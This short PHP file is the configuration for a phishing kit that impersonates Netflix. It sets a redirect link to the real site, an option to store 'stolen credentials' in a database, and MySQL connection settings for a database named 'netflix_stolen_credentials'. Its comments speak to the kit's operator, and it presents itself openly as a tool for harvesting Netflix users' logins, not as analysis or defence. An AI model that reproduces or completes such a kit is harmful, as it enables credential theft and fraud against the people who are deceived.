<?php
# Config file for phishing on Netflix

$netflix_link = "https://www.netflix.com";

// if you wanna save your stolen credentials on
// a database, you can choose to set this to TRUE (DEFAULT: false);
$use_db = false;

// database properties
$db_host = "localhost"; // your host
$db_user = "root"; // your mysql user
$db_pass = ""; // your mysql password (DEFAULT: empty)
$db_name = "netflix_stolen_credentials"; // your database name

?>
